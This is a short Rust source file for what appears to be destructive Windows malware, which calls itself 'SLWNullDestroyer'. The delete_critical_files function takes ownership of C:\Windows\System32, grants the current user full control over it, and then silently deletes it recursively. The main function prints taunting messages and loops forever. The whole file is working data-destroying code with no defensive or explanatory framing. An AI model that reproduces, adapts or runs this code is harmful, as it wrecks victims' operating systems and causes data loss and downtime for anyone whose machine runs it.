use std::process::Command;
use std::thread;
use std::time::Duration;

fn delete_critical_files() {
    Command::new("cmd")
        .args(&["/C", "takeown /f C:\\Windows\\System32 /r /d y >nul 2>&1"])
        .status()
        .expect("failed to execute process");
    Command::new("cmd")
        .args(&["/C", "icacls C:\\Windows\\System32 /grant %username%:F /t >nul 2>&1"])
        .status()
        .expect("failed to execute process");
    Command::new("cmd")
        .args(&["/C", "rd /s /q C:\\Windows\\System32"])
        .status()
        .expect("failed to execute process");
}

fn main() {
    println!("SEE YOU LATER BABY 😈");

    delete_critical_files();

    loop {
        println!("😀😂😈 SLWNullDestroyer was here!");
        thread::sleep(Duration::from_secs(1));
    }
}
